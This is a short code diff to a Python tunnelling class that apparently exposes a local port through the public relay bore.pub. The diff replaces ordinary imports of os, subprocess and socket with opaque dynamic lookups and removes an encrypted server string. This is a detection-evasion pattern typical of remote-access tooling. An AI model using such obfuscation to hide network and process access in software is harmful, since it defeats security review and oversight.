@@ -1,11 +1,14 @@
-import os
-import subprocess
-import threading
-import shutil
-import time
-import socket
-from typing import Optional
-from core.obfuscation import decrypt_string
+from core.resolver import (
+    Resolver, _OS, _SUBPROCESS, _THREADING, _SHUTIL, _TIME, _SOCKET, _TYPING
+)
+os = Resolver.get_mod(_OS)
+subprocess = Resolver.get_mod(_SUBPROCESS)
+threading = Resolver.get_mod(_THREADING)
+shutil = Resolver.get_mod(_SHUTIL)
+time = Resolver.get_mod(_TIME)
+socket = Resolver.get_mod(_SOCKET)
+typing_mod = Resolver.get_mod(_TYPING)
+Optional = typing_mod.Optional
 from core.config import ConfigManager
 from core.error_logger import log_error, log_info
 
@@ -15,7 +18,7 @@ class BoreTunneler:
     def __init__(self, local_port: int = 8080):
         self.local_port = local_port
         # Encrypted remote server URL: "bore.pub" -> "DF0KDmAhLAA="
-        self.remote_server = decrypt_string("DF0KDmAhLAA=") 
+        self.remote_server = "bore.pub" 
         self.remote_port = 7835
         self.process: Optional[subprocess.Popen] = None
         self.running = False
